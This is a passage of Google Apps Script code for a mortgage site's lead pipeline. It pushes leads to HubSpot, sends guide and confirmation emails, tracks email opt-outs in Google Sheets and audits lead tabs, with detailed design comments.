  return m ? (m[1] || '/') : '';
}

/**
 * The HubSpot fields for a lead, as [{objectTypeId, name, value}], built from
 * what the site already sends. Pure, so it is testable without HTTP.
 *
 * Blank is left out, never filled in. HubSpot treats a submitted value as the
 * truth and overwrites what the contact already had, so sending '' or 0 for a
 * field this form did not ask would erase a real answer from an earlier one.
 */
function leadSnapshot(data) {
  const out = {};
  Object.keys(data).forEach(function (key) {
    if (key.charAt(0) === '_' || /token|secret|password|api.?key|hutk/i.test(key)) return;
    out[key] = data[key];
  });
  return out;
}

function hubspotFields(data) {
  const fields = [];
  function add(name, value) {
    if (value === null || value === undefined) return;
    const v = String(value).trim();
    if (v === '') return;
    for (let i = 0; i < fields.length; i++) if (fields[i].name === name) return; // first value wins
    fields.push({ objectTypeId: '0-1', name: name, value: v });
  }

  add('email', data.email);
  add('firstname', data.firstName);
  add('lastname', data.lastName);
  add('phone', data.phone);
  add('state', data.state);

  add('rdt_lead_source', data.source);
  add('rdt_form_id', data.formId);
  add('rdt_page_path', urlPath(data.pageUri));

  // The latest click, then the first touch's if it was a different network.
  // Both, when both exist, because they answer different questions: the latest
  // is what Ads credits, the first is what found the lead.
  const lastProp = Object.prototype.hasOwnProperty.call(HUBSPOT_CLICK_ID_PROPS, data.clickIdType)
    ? HUBSPOT_CLICK_ID_PROPS[data.clickIdType] : null;
  const firstProp = Object.prototype.hasOwnProperty.call(HUBSPOT_CLICK_ID_PROPS, data.firstClickIdType)
    ? HUBSPOT_CLICK_ID_PROPS[data.firstClickIdType] : null;
  if (lastProp) add(lastProp, data.clickId);
  if (firstProp) add(firstProp, data.firstClickId);

  // HubSpot's own Google click id, so its Ads integration can match the lead
  // without anyone mapping rdt_gclid. It may be read-only or absent from the
  // form, in which case the resubmit in pushToHubSpot drops it and the hutk
  // plus rdt_gclid carry the click instead.
  const gclid = data.clickIdType === 'gclid' ? data.clickId
    : (data.firstClickIdType === 'gclid' ? data.firstClickId : '');
  add('hs_google_click_id', gclid);

  add('rdt_first_utm_source', data.firstUtmSource);
  add('rdt_first_utm_medium', data.firstUtmMedium);
  add('rdt_first_utm_campaign', data.firstUtmCampaign);
  add('rdt_latest_utm_source', data.utm_source);
  add('rdt_latest_utm_medium', data.utm_medium);
  add('rdt_latest_utm_campaign', data.utm_campaign);

  // Only with a state to judge by: 'No' for a lead who never said where they
  // are would read as "out of area", which is a claim nobody made.
  if (data.state) add('rdt_licensed_state', isLicensedState(data.state) ? 'Yes' : 'No');
  add('rdt_test_lead', isTestLead(data) ? 'Yes' : 'No');

  // Admin-approved API form fields only. Adding properties is not SMS enrollment.
  // Blank omission preserves existing contact answers; the snapshot keeps history.
  let mapping = {};
  try { mapping = JSON.parse(PropertiesService.getScriptProperties().getProperty('HUBSPOT_DETAIL_FIELD_MAP') || '{}'); }
  catch (err) { Logger.log('Invalid HubSpot detail mapping; existing fields preserved'); }
  if (!mapping || Array.isArray(mapping) || typeof mapping !== 'object') mapping = {};
  Object.keys(mapping).forEach(function (key) {
    const name = mapping[key];
    if (typeof name !== 'string' || (!/^rdt_[a-z0-9_]+$/.test(name) && ['loan_amount', 'loan_type', 'property_use', 'lead_source_detail'].indexOf(name) < 0)) return;
    const value = key === 'submissionSnapshot' ? leadSnapshot(data) : key === 'loanAmount' ? plainNumber(data.loanAmount) : data[key];
    if (/^sms.*Consent$/.test(key) && value !== true) return; // no new opt-in is not a subscription revocation
    add(name, typeof value === 'object' && value !== null ? JSON.stringify(value) : value);
  });

  return fields;
}

/** The submission context. hutk only when it has the shape HubSpot issues. */
function hubspotContext(data) {
  const context = {};
  if (/^[a-f0-9]{32}$/i.test(String(data.hutk || ''))) context.hutk = data.hutk;
  if (data.pageUri) context.pageUri = String(data.pageUri);
  if (data.pageName) context.pageName = String(data.pageName);
  return context;
}

/**
 * The field names a 400 blames, from HubSpot's error body. The Forms API names
 * each one as "fields.<name>" in its messages, whatever the error type (not on
 * the form, read-only, not a valid option). Empty when nothing is named, which
 * is what makes a 400 about something else a plain rejection.
 */
function hubspotRejectedFields(text) {
  const names = [];
  let messages = [];
  try {
    const body = JSON.parse(String(text || ''));
    messages = (body && body.errors ? body.errors : []).map(function (e) { return String((e && e.message) || ''); });
  } catch (e) {
    messages = [String(text || '')];
  }
  messages.forEach(function (m) {
    const re = /fields\.([A-Za-z0-9_]+)/g;
    let hit;
    while ((hit = re.exec(m)) !== null) {
      if (names.indexOf(hit[1]) === -1) names.push(hit[1]);
    }
  });
  return names;
}

/**
 * Says, once every 6 hours at most, that HubSpot is refusing fields.
 *
 * The resubmit saves the lead, which is right, but it also makes the loss quiet:
 * a form missing rdt_gclid would drop the click id from every lead while every
 * row read 'done'. That is a setup problem with one fix (add the field to the
 * form), and the first real lead is the moment to hear about it. Not
 * alertFailure: nothing failed and its subject says LEAD PIPELINE FAILURE, and
 * its 5-minute throttle would still send one of these per lead on a busy day.
 */
const HUBSPOT_DROPPED_ALERT_KEY = 'hubspot_dropped_alert';
function alertHubSpotDroppedFields(dropped, code) {
  try {
    const cache = CacheService.getScriptCache();
    if (cache.get(HUBSPOT_DROPPED_ALERT_KEY)) return;
    cache.put(HUBSPOT_DROPPED_ALERT_KEY, '1', 21600); // 6h, CacheService's maximum
    MailApp.sendEmail({
      to: ALERT_EMAIL,
      subject: 'HubSpot is dropping lead fields: ' + dropped.join(', '),
      body: 'HubSpot refused these fields, so leads are being submitted without them:\n\n  ' +
        dropped.join('\n  ') + '\n\n' +
        'The resubmit without them returned HTTP ' + code + '. ' +
        (code >= 200 && code < 300 ? 'The leads themselves ARE reaching HubSpot.' : 'The lead did NOT reach HubSpot either; see the Follow-ups tab.') +
        '\n\nFix: add each one to the HubSpot API form as a hidden field (the contact property alone is not enough; ' +
        'the Forms API rejects any field the form does not declare).\n\n' +
        'The Debug tab has HubSpot\'s exact answer. This email repeats at most every 6 hours.'
    });
  } catch (err) {
    Logger.log('alertHubSpotDroppedFields failed: ' + err.toString());
  }
}

/**
 * Submits the lead to HubSpot. Returns { outcome, detail } in the guide senders'
 * vocabulary, so the follow-up queue retries and alerts on it the same way:
 *   skipped  - not configured, a test lead, or no email to make a contact from
 *   sent     - 2xx. A returning lead is a 2xx too: HubSpot dedupes by email and
 *              updates the one contact, so there is nothing to tell apart
 *   retry    - 429, 5xx, or the call threw
 *   rejected - any other 4xx: wrong form GUID, a form that demands a field we
 *              do not have, a bad value. Retrying cannot fix those
 *
 * SKIPS rather than rejects without its Script Properties, like
 * sendContactConfirmation and for the same reason: this ships before Kocah has
 * built the form, and an unset property must not turn every lead's follow-up
 * row red. It turns on the moment both are set, with no deploy.
 */
function pushToHubSpot(ss, data) {
  const props = PropertiesService.getScriptProperties();
  const portalId = String(props.getProperty('HUBSPOT_PORTAL_ID') || '').trim();
  const formGuid = String(props.getProperty('HUBSPOT_FORM_GUID') || '').trim();
  if (!portalId || !formGuid) {
    logDebug(ss, 'pushToHubSpot: skipped, HUBSPOT_PORTAL_ID/HUBSPOT_FORM_GUID not set', data.email);
    return { outcome: 'skipped' };
  }
  // A test lead is not a contact: test prospects once sat Active in Bonzo's live
  // campaigns and polluted every metric Darren read. The override
  // exists so the whole path can be proved end to end before it matters; those
  // contacts still carry rdt_test_lead = Yes, so they can be filtered or deleted.
  if (isTestLead(data) && String(props.getProperty('HUBSPOT_SEND_TESTS') || '').trim().toLowerCase() !== 'true') {
    logDebug(ss, 'pushToHubSpot: skipped, test lead', data.email);
    return { outcome: 'skipped' };
  }
  if (!String(data.email || '').trim()) {
    // Phone-only leads are allowed by /api/lead. They are in the Sheet;
    // HubSpot identifies contacts by email and would record nobody.
    logDebug(ss, 'pushToHubSpot: skipped, no email', '');
    return { outcome: 'skipped' };
  }

  const host = String(props.getProperty('HUBSPOT_FORMS_HOST') || '').trim() || HUBSPOT_DEFAULT_HOST;
  const url = 'https://' + host + '/submissions/v3/integration/submit/' +
    encodeURIComponent(portalId) + '/' + encodeURIComponent(formGuid);
  const context = hubspotContext(data);

  function submit(fields) {
    const body = { fields: fields };
    if (Object.keys(context).length) body.context = context;
    const resp = UrlFetchApp.fetch(url, {
      method: 'post',
      contentType: 'application/json',
      payload: JSON.stringify(body),
      muteHttpExceptions: true, // the Sheet row is safe; a HubSpot error must not throw past here
    });
    return { code: resp.getResponseCode(), text: String(resp.getContentText() || '').slice(0, 500) };
  }

  try {
    let fields = hubspotFields(data);
    let res = submit(fields);
    let dropped = [];

    // One resubmit without the fields HubSpot named. Since 2022 the Forms API
    // refuses the WHOLE submission over a single field the form does not
    // declare, so one rdt_* property Kocah has not added yet, or HubSpot
    // refusing hs_google_click_id, would otherwise cost the lead its contact
    // entirely. The name, email and whatever else the form accepts are worth
    // far more than the field that caused it. Once only: if the second answer
    // is still a 400, it is something a resubmit cannot fix.
    if (res.code === 400) {
      dropped = hubspotRejectedFields(res.text).filter(function (n) {
        return HUBSPOT_REQUIRED_FIELDS.indexOf(n) === -1;
      });
      if (dropped.length) {
        fields = fields.filter(function (f) { return dropped.indexOf(f.name) === -1; });
        logDebug(ss, 'pushToHubSpot: resubmitting without ' + dropped.join(', ') + ' (HubSpot: ' + res.text + ')', data.email);
        res = submit(fields);
        // hs_google_click_id is allowed to be refused (it is HubSpot's own and
        // may be read-only); rdt_gclid and the hutk carry the click without it.
        // Anything else missing from the form is a setup gap worth hearing about.
        const worthAlerting = dropped.filter(function (n) { return n !== 'hs_google_click_id'; });
        if (worthAlerting.length) alertHubSpotDroppedFields(worthAlerting, res.code);
      }
    }

    const outcome = classifyGuideResponse(res.code);
    const said = res.code + (outcome === 'sent' ? '' : ' ' + res.text) +
      (dropped.length ? ' (dropped: ' + dropped.join(', ') + ')' : '');
    logDebug(ss, 'pushToHubSpot: ' + said, data.email);
    return { outcome: outcome, detail: 'pushToHubSpot ' + said };
  } catch (err) {
    logDebug(ss, 'pushToHubSpot: threw ' + err.toString(), data.email);
    return { outcome: 'retry', detail: 'pushToHubSpot threw ' + err.toString() };
  }
}

// Writes to a "Debug" sheet tab instead of (or alongside) Logger.log — Apps
// Script's Cloud Logging for web-app-triggered executions is unreliable
// (frequently shows "No logs are available" even on completed runs), so this
// is the trustworthy way to see what happened. It is kept rather than removed
// because it is the only place a guide failure's detail is readable after the
// fact; trimDebugTab() below stops it growing without bound.
// Email is third so the tab can be read as "what happened, and to whom". Rows
// written before the column existed stay blank under it: ensureHeaders only
// appends, and never rewrites a cell a historical row already meant.
const DEBUG_HEADERS = ['Timestamp', 'Message', 'Email'];

/**
 * Rows to keep in the Debug tab. It gains a row per guide attempt, so left
 * alone it grows forever and eventually costs a Sheet that has real lead data
 * in it. Trimmed once a day rather than on every write: deleting rows is slow,
 * and doPost must stay fast.
 */
const DEBUG_MAX_ROWS = 2000;

/** Drops the oldest Debug rows, keeping the newest DEBUG_MAX_ROWS. */
function trimDebugTab(ss) {
  try {
    const sheet = ss.getSheetByName('Debug');
    if (!sheet) return;
    const dataRows = sheet.getLastRow() - 1; // excluding the header
    if (dataRows <= DEBUG_MAX_ROWS) return;
    // Oldest rows are at the top: logDebug appends.
    sheet.deleteRows(2, dataRows - DEBUG_MAX_ROWS);
  } catch (err) {
    Logger.log('trimDebugTab failed: ' + err.toString()); // never break the digest
  }
}

function logDebug(ss, message, email) {
  try {
    const sheet = getOrCreateSheet(ss, 'Debug', DEBUG_HEADERS);
    appendSafeRow(sheet, [new Date().toISOString(), message, email || '']);
  } catch (err) {
    // never let debug logging itself break the lead flow
  }
}

/**
 * What happened to a guide email. The queue needs this to tell "sent" apart
 * from "failed": the senders used to log and swallow every failure, so a lead
 * whose guide never went out was still marked done.
 *   skipped  - this funnel has no guide (not an error)
 *   sent     - 2xx
 *   retry    - worth trying again: Resend busy/down (503 from our function),
 *              any other 5xx, 429, or the call itself threw
 *   rejected - will fail the same way every time: invalid address (422),
 *              bad key (401/403), missing config
 */
function classifyGuideResponse(code) {
  if (code >= 200 && code < 300) return 'sent';
  if (code === 429 || code >= 500) return 'retry';
  return 'rejected';
}

/**
 * Records an explicit unsubscribe request before any more site email sends.
 * Called by an operator now; an inbox integration can call this once Darren
 * connects the inbox receiving replies. It does not claim to read that inbox
 * or change HubSpot's separate subscription settings.
 */
function recordEmailOptOut(email) {
  const props = PropertiesService.getScriptProperties();
  const senderUrl = String(props.getProperty('NETLIFY_CONTACT_CONFIRM_URL') || '');
  const key = props.getProperty('NETLIFY_CONTACT_CONFIRM_KEY');
  if (!/^https:\/\/realdarrentsai\.com\/api\/send-contact-confirmation$/.test(senderUrl) || !key) throw new Error('Email preference endpoint not configured');
  const response = UrlFetchApp.fetch(senderUrl.replace('/send-contact-confirmation', '/stop-email'), {
    method: 'post', contentType: 'application/json', headers: { 'x-api-key': key },
    payload: JSON.stringify({ email: String(email || '').trim(), reason: 'manual' }), muteHttpExceptions: true,
  });
  if (response.getResponseCode() !== 200 || JSON.parse(response.getContentText()).suppressed !== true) throw new Error('Could not record email opt-out');
  return { suppressed: true };
}

/** Append-only display column on every existing lead tab, never on Debug or
 * Follow-ups. Blank means no recorded opt-out; TRUE means stop website email.
 * Match all submissions for the address, preserving every other cell. */
function emailOptOutSheets(ss) {
  const names = leadTabSchemas().map(function (schema) { return schema.tab; }).concat(['Newsletter', 'Qualify']);
  return names.filter(function (name, index) { return names.indexOf(name) === index; })
    .map(function (name) { return ss.getSheetByName(name); }).filter(Boolean);
}
function markLeadEmailUnsubscribed(ss, email) {
  const address = String(email || '').trim().toLowerCase();
  if (!address) return;
  emailOptOutSheets(ss).forEach(function (sheet) {
    const headers = liveHeaders(sheet);
    const emailColumn = headers.indexOf('Email');
    if (emailColumn < 0) return;
    let unsubscribeColumn = headers.indexOf('Unsubscribe?');
    if (unsubscribeColumn < 0) {
      unsubscribeColumn = headers.length;
      sheet.getRange(1, unsubscribeColumn + 1, 1, 1).setValues([['Unsubscribe?']]);
      styleHeaderRange(sheet.getRange(1, unsubscribeColumn + 1, 1, 1));
    }
    if (sheet.getLastRow() < 2) return;
    const emails = sheet.getRange(2, emailColumn + 1, sheet.getLastRow() - 1, 1).getValues();
    emails.forEach(function (row, index) {
      if (String(row[0] || '').trim().toLowerCase() === address) {
        sheet.getRange(index + 2, unsubscribeColumn + 1, 1, 1).setValues([[true]]);
      }
    });
  });
}
function initializeEmailOptOutColumns() {
  const ss = SpreadsheetApp.openById(SPREADSHEET_ID);
  withSheetLock(function () { markLeadEmailUnsubscribed(ss, '__column_setup__'); });
}
function leadEmailUnsubscribed(ss, email) {
  const address = String(email || '').trim().toLowerCase();
  return emailOptOutSheets(ss).some(function (sheet) {
    const headers = liveHeaders(sheet);
    const emailColumn = headers.indexOf('Email'), optOutColumn = headers.indexOf('Unsubscribe?');
    if (emailColumn < 0 || optOutColumn < 0 || sheet.getLastRow() < 2) return false;
    return sheet.getRange(2, 1, sheet.getLastRow() - 1, headers.length).getValues().some(function (row) {
      return String(row[emailColumn] || '').trim().toLowerCase() === address &&
        String(row[optOutColumn]).toLowerCase() === 'true';
    });
  });
}
function syncEmailOptOuts(ss) {
  const props = PropertiesService.getScriptProperties();
  const url = String(props.getProperty('NETLIFY_CONTACT_CONFIRM_URL') || '').replace('/send-contact-confirmation', '/stop-email');
  const key = props.getProperty('NETLIFY_CONTACT_CONFIRM_KEY');
  if (url !== 'https://realdarrentsai.com/api/stop-email' || !key) return;
  function request(body) {
    const response = UrlFetchApp.fetch(url, { method: 'post', contentType: 'application/json',
      headers: { 'x-api-key': key }, payload: JSON.stringify(body), muteHttpExceptions: true });
    if (response.getResponseCode() !== 200) throw new Error('Email preference sync unavailable');
    return JSON.parse(response.getContentText());
  }
  try {
    withSheetLock(function () { markLeadEmailUnsubscribed(ss, '__column_setup__'); });
    const pending = request({ operation: 'pending' }).emails || [];
    pending.forEach(function (email) {
      withSheetLock(function () { markLeadEmailUnsubscribed(ss, email); SpreadsheetApp.flush(); });
      request({ operation: 'acknowledge', email: email });
    });
  } catch (err) {
    // The opt-out is already enforced by Netlify. Retain the outbox and retry
    // next minute; this display-sync failure must not email Darren or block leads.
    Logger.log('Email preference Sheet sync deferred: ' + err.toString());
  }
}

function postGuide(ss, name, urlProp, keyProp, body) {
  const props = PropertiesService.getScriptProperties();
  if (leadEmailUnsubscribed(ss, body.email)) {
    recordEmailOptOut(body.email);
    return { outcome: 'skipped', detail: name + ': recipient opted out in Sheet' };
  }
  const url = props.getProperty(urlProp);
  const key = props.getProperty(keyProp);
  if (!url || !key) {
    logDebug(ss, name + ': ' + urlProp + '/KEY not set', body.email);
    return { outcome: 'rejected', detail: name + ': ' + urlProp + '/KEY not set' };
  }
  try {
    const resp = UrlFetchApp.fetch(url, {
      method: 'post',
      contentType: 'application/json',
      headers: { 'x-api-key': key },
      payload: JSON.stringify(body),
      muteHttpExceptions: true, // never let an email failure break the lead flow
    });
    const code = resp.getResponseCode();
    const text = resp.getContentText().slice(0, 500);
    logDebug(ss, name + ': url=' + url + ' response ' + code + ' ' + text, body.email);
    if (code >= 200 && code < 300) {
      try {
        if (JSON.parse(text).suppressed === true) {
          withSheetLock(function () { markLeadEmailUnsubscribed(ss, body.email); });
          return { outcome: 'skipped', detail: name + ': recipient opted out' };
        }
      } catch { /* Older senders return a plain success body; keep compatibility. */ }
    }
    return { outcome: classifyGuideResponse(code), detail: name + ' ' + code + ' ' + text };
  } catch (err) {
    logDebug(ss, name + ': threw ' + err.toString(), body.email);
    return { outcome: 'retry', detail: name + ' threw ' + err.toString() };
  }
}

function sendDscrGuide(ss, data) {
  if (data.source !== 'dscr') return { outcome: 'skipped' }; // only the DSCR funnel has a guide to send
  return postGuide(ss, 'sendDscrGuide', 'NETLIFY_DSCR_PDF_URL', 'NETLIFY_DSCR_PDF_KEY', {
    firstName: data.firstName || '',
    lastName: data.lastName || '',
    email: data.email || '',
    dscr: data.dscr || '',
    downPayment: data.downPayment || '',
    rate: data.rate || '',
    loanAmount: data.loanAmount || '',
  });
}

function sendReiGuide(ss, data) {
  if (data.source !== 'real-estate-investing') return { outcome: 'skipped' }; // only the REI funnel has a guide to send
  return postGuide(ss, 'sendReiGuide', 'NETLIFY_REI_PDF_URL', 'NETLIFY_REI_PDF_KEY', {
    firstName: data.firstName || '',
    lastName: data.lastName || '',
    email: data.email || '',
  });
}

function sendFhaGuide(ss, data) {
  if (data.source !== 'fha') return { outcome: 'skipped' }; // only the FHA funnel has a guide to send
  return postGuide(ss, 'sendFhaGuide', 'NETLIFY_FHA_PDF_URL', 'NETLIFY_FHA_PDF_KEY', {
    firstName: data.firstName || '',
    lastName: data.lastName || '',
    email: data.email || '',
  });
}

/**
 * The contact modal's instant reply.
 *
 * Not a magnet: there is no attachment, and what it sends is the calendar, so
 * someone who has just asked to be contacted can pick a time instead of waiting.
 * Every magnet form sent the visitor something and this one, the form that asks
 * the most, sent nothing at all.
 *
 * SKIPS rather than rejects when its Script Properties are missing, which is the
 * one place this differs from postGuide's own handling. A guide is a promise the
 * page made and a missing one is a failure worth alerting on; this email is not
 * promised anywhere, so an unset property must not turn every contact lead's
 * follow-up row red and mail Darren a LEAD PIPELINE FAILURE for a lead that
 * arrived perfectly. It also means the Netlify function and this file can be
 * deployed in either order.
 */
/**
 * Which confirmation email a lead gets, or '' for none (R2, 10 Oct 2026).
 *
 * WHY. Every magnet form sent the visitor something and the contact modal sent
 * its "Got your details" email, but a lead from the debt, home equity or ADU
 * calculator got nothing, though those forms ask the most. The revamp brief
 * (section 11.1) asks for a confirmation that fits the funnel, on the same
 * template; Max approved the copy on 10 Oct (docs/revamp/confirmation-email-copy.md).
 * The words live in netlify/functions/send-contact-confirmation.mts; this only
 * names which set.
 *
 * The mortgage calculator's modal gets its review email only when the
 * calculator's numbers came with it: that email thanks the visitor for them,
 * and a modal opened from the nav with nothing in the calculator has none. It
 * gets the contact email instead, as before.
 */
const CONFIRMATION_CONTEXTS = {
  'DebtConsolidation': 'debt',
  'home-equity':       'home-equity',
  'adu':               'adu'
};

function confirmationContext(data) {
  const source = data && data.source;
  if (Object.prototype.hasOwnProperty.call(CONFIRMATION_CONTEXTS, source)) return CONFIRMATION_CONTEXTS[source];
  if (source === 'mortgage-calculator-contact' && Number(data.loanAmount) > 0) return 'mortgage-review';
  if (Object.prototype.hasOwnProperty.call(CONTACT_SOURCES, source)) return 'contact';
  return '';
}

function sendContactConfirmation(ss, data) {
  const context = confirmationContext(data);
  if (!context) return { outcome: 'skipped' };
  const props = PropertiesService.getScriptProperties();
  if (!props.getProperty('NETLIFY_CONTACT_CONFIRM_URL') || !props.getProperty('NETLIFY_CONTACT_CONFIRM_KEY')) {
    return { outcome: 'skipped' };
  }
  const body = {
    firstName: data.firstName || '',
    lastName: data.lastName || '',
    email: data.email || '',
    message: data.message || ''
  };
  // The contact email is the template's default, so a contact lead's body stays
  // exactly what it was before contexts existed. The others name their set, and
  // the two dropdown answers the copy may mention, which the template only ever
  // turns into a phrase from its own fixed list.
  if (context !== 'contact') {
    body.context = context;
    body.goal = data.goal || '';
    body.projectPurpose = data.projectPurpose || '';
  }
  return postGuide(ss, 'sendContactConfirmation', 'NETLIFY_CONTACT_CONFIRM_URL', 'NETLIFY_CONTACT_CONFIRM_KEY', body);
}

/** Run whichever guide applies to this lead (at most one does). */
function sendGuideFor(ss, data) {
  const results = [sendDscrGuide(ss, data), sendReiGuide(ss, data), sendFhaGuide(ss, data), sendContactConfirmation(ss, data)];
  for (let i = 0; i < results.length; i++) {
    if (results[i] && results[i].outcome !== 'skipped') return results[i];
  }
  return { outcome: 'skipped' };
}

// Email Darren when a lead fails to land, including the raw payload so it can
// be recovered by hand. Rate-limited to one alert per 5 minutes: a systemic
// outage would otherwise burn the 100/day consumer Gmail quota in minutes and
// bury the first, most useful alert.
// Comma-separated, which MailApp accepts as one string. Both addresses get
// every alert and every digest: a lost lead needs someone to act on it, and one
// inbox is one holiday away from silence.
const ALERT_EMAIL = 'darren@realdarrentsai.com,liannemaxbalbastro@gmail.com';
function alertFailure(subjectDetail, rawPayload) {
  try {
    const cache = CacheService.getScriptCache();
    if (cache.get('alert_sent')) return;
    cache.put('alert_sent', '1', 300);
    MailApp.sendEmail({
      to: ALERT_EMAIL,
      subject: 'LEAD PIPELINE FAILURE — realdarrentsai.com',
      body: subjectDetail + '\n\nRAW PAYLOAD (recover this lead by hand):\n' + rawPayload +
            '\n\nFurther alerts are suppressed for 5 minutes.'
    });
  } catch (err) {
    Logger.log('alertFailure itself failed: ' + err.toString());
  }
}

function doPost(e) {
  let raw = '{}';
  // Only the sheet write and the follow-up enqueue are serialised; no HTTP
  // happens inside doPost any more (see processFollowUps).
  const lock = LockService.getScriptLock();
  try {
    raw = (e && e.postData && e.postData.contents) ? e.postData.contents : '{}';
    let data;
    try {
      data = JSON.parse(raw);
    } catch {
      // Malformed anonymous input is not a lost real lead and must not alert
      // Darren. The proxy already validates JSON before this server hop.
      return ContentService.createTextOutput(JSON.stringify({ success: false, error: 'Invalid JSON' }))
        .setMimeType(ContentService.MimeType.JSON);
    }
    if (!data || typeof data !== 'object' || Array.isArray(data)) {
      return ContentService.createTextOutput(JSON.stringify({ success: false, error: 'Invalid payload' }))
        .setMimeType(ContentService.MimeType.JSON);
    }
    // The public exec URL formerly bypassed every proxy abuse guard. During
    // rollout the existing confirmation key is a compatible private fallback;
    // LEAD_PROXY_KEY permits independent rotation after both sides are ready.
    // Reject before Sheet access or alerts, and remove credentials from logs.
    const proxyKey = PropertiesService.getScriptProperties().getProperty('LEAD_PROXY_KEY') ||
      PropertiesService.getScriptProperties().getProperty('NETLIFY_CONTACT_CONFIRM_KEY');
    const suppliedKey = typeof data._proxyKey === 'string' ? data._proxyKey : '';
    delete data._proxyKey;
    raw = JSON.stringify(data);
    if (proxyKey) {
      let difference = suppliedKey.length ^ proxyKey.length;
      for (let i = 0; i < proxyKey.length; i++) {
        difference |= proxyKey.charCodeAt(i) ^ (suppliedKey.charCodeAt(i) || 0);
      }
      if (difference) return ContentService.createTextOutput(JSON.stringify({ success: false, error: 'Unauthorized' }))
        .setMimeType(ContentService.MimeType.JSON);
    }
    const ss = SpreadsheetApp.openById(SPREADSHEET_ID);

    lock.waitLock(20000);

    // Minted here rather than by the form, so every row has one whatever sent
    // it, and a replayed payload keeps the id it was first given.
    if (!data.submissionId) data.submissionId = Utilities.getUuid();

    if (data.source === 'newsletter') {
      const sheet = getOrCreateSheet(ss, 'Newsletter', NEWSLETTER_HEADERS);
      appendSafeRow(sheet, [
        data.timestamp || new Date().toISOString(),
        data.email     || '',
        'newsletter'
      ]);
    } else if (data.source === 'QualifyForm') {
      const sheet = ss.getSheetByName('Qualify') || createSheetWithHeaders(ss, 'Qualify', QUALIFY_HEADERS);
      appendByHeader(ss, sheet, 'Qualify', QUALIFY_HEADERS, byHeader(QUALIFY_HEADERS, [
        data.timestamp   || new Date().toISOString(),
        data.firstName   || '',
        data.lastName    || '',
        data.email       || '',
        data.phone       || '',
        data.loanType    || '',
        data.timeline    || '',
        data.priceRange  || '',
        data.creditRange || '',
        data.employment  || '',
        data.notes       || '',
        'QualifyForm'
      ].concat(attrRow(data), triageRow(data))));
    } else {
      // Each funnel writes to its OWN tab with its own columns; anything without
      // a schema lands on Leads rather than being lost. hasOwnProperty, not a
      // bare lookup: data.source arrives from the posted body, and a source of
      // 'constructor' would otherwise find an inherited property and be treated
      // as a schema with no tab.
      const schema = Object.prototype.hasOwnProperty.call(SOURCE_SCHEMAS, data.source)
        ? SOURCE_SCHEMAS[data.source]
        : LEADS_SCHEMA;
      writeLead(ss, schema, data);
    }

    // Queue the slow work instead of doing it here. The CRM push plus the guide
    // calls (one of which renders a PDF) routinely ran past the /api/lead
    // proxy's 8s budget: the lead saved, but the visitor was told it failed and
    // Darren got a false "LEAD NOT SAVED" alert. Replying as soon as the row is
    // written keeps this response fast; processFollowUps does the rest within
    // about a minute.
    //
    // Re-serialised so the queued payload carries the Submission ID the row was
    // just given. `raw` stays as received for the failure alert below.
    enqueueFollowUp(ss, data, JSON.stringify(data));
    lock.releaseLock();
    // Acquire the optional queue's lock only after the primary write releases
    // its own. Nested lock ownership must not shorten the primary critical section.
    try { enqueueCallRailSync(ss, data); } catch (err) { logDebug(ss, 'CallRail sync enqueue needs review: ' + err.toString(), data.email); }

    return ContentService
      .createTextOutput(JSON.stringify({ success: true }))
      .setMimeType(ContentService.MimeType.JSON);

  } catch (err) {
    // The lead is the product; losing one silently is the worst outcome here.
    // The alert carries the raw payload so it can be recovered by hand even if
    // the sheet write failed.
    alertFailure('doPost threw: ' + err.toString(), raw);
    return ContentService
      .createTextOutput(JSON.stringify({ success: false, error: err.toString() }))
      .setMimeType(ContentService.MimeType.JSON);
  } finally {
    try { lock.releaseLock(); } catch (e) { /* already released on the happy path */ }
  }
}

// ---------------------------------------------------------------------------
// Lead tab audit and migration. Both are run BY HAND from the Apps Script
// editor; nothing calls them. See docs/MANUAL-TEST-RUNBOOK.md for the order.
// ---------------------------------------------------------------------------
//
// WHY A FUNCTION AND NOT A DRAG. Moving a column in the Sheets UI works, until
// one is dropped a place out, or a filter view was pinned to column letters, or
// two people do it on the same afternoon. A column's position is then whatever
// the last person left, with no record. This rebuilds each tab from its header
// NAMES into the schema's order, verifies the result against the original
// before anything is renamed, and leaves the original beside it untouched.
//
// It never deletes a lead tab and never edits one in place. The worst outcome of
// a run that goes wrong is a "(new)" tab to delete.

/** True when every value a person or a form could have put in a cell is absent. */
function isBlankCell(v) {
  return v === '' || v === null || v === undefined;
}

/** Two cell values that are the same value, Dates included. */
function sameCell(a, b) {
  if (a instanceof Date && b instanceof Date) return a.getTime() === b.getTime();
  return a === b || String(a) === String(b);
}

/**
 * Where each column of a live tab goes under a schema. Pure: takes the header
 * row and the data rows, returns the plan and anything worth saying about it.
 *
 *   kept     schema header -> the live column indexes that feed it (more than
 *            one when the sheet has the header twice)
 *   extras   live columns the schema does not know, carried across after the
 *            schema's own so nothing a person added by hand is lost
 *   dropped  live columns deliberately left behind (DROPPED_HEADERS)
 *   empty    blank-headed columns with nothing under them, left behind
 */
function planTabMigration(tabName, live, headers, rows) {
  const dropList = Object.prototype.hasOwnProperty.call(DROPPED_HEADERS, tabName) ? DROPPED_HEADERS[tabName] : [];
  const oldNames = {}; // an old name -> the schema header it became
  Object.keys(HEADER_ALIASES).forEach(function (h) {
    HEADER_ALIASES[h].forEach(function (old) { oldNames[old] = h; });
  });

  const kept = {};
  headers.forEach(function (h) { kept[h] = []; });
  const extras = [];
  const dropped = [];
  let empty = 0;

  live.forEach(function (name, i) {
    const target = Object.prototype.hasOwnProperty.call(oldNames, name) ? oldNames[name] : name;
    if (dropList.indexOf(name) !== -1) { dropped.push(name); return; }
    if (name !== '' && Object.prototype.hasOwnProperty.call(kept, target)) { kept[target].push(i); return; }
    const hasData = rows.some(function (r) { return !isBlankCell(r[i]); });
    if (name === '' && !hasData) { empty++; return; }
    extras.push({ index: i, name: name });
  });

  return { kept: kept, extras: extras, dropped: dropped, empty: empty };
}

/**
 * Reports each lead tab against its schema, to the Debug tab and the execution
 * log. Read-only. Run it before migrateLeadTabs(), and fix or accept what it
 * says: an extra column is carried across, a formula is copied as its value.
 */
function auditLeadTabs() {
  const ss = SpreadsheetApp.openById(SPREADSHEET_ID);
  const lines = [];
  leadTabSchemas().forEach(function (schema) {
    const sheet = ss.getSheetByName(schema.tab);
    if (!sheet) { lines.push(schema.tab + ': no such tab yet (it is created, in order, on its first lead)'); return; }
    const grid = sheet.getDataRange().getValues();
    const live = (grid[0] || []).map(function (h) { return String(isBlankCell(h) ? '' : h).trim(); });
    const rows = grid.slice(1);
    const plan = planTabMigration(schema.tab, live, schema.headers, rows);
    const missing = schema.headers.filter(function (h) { return plan.kept[h].length === 0; });
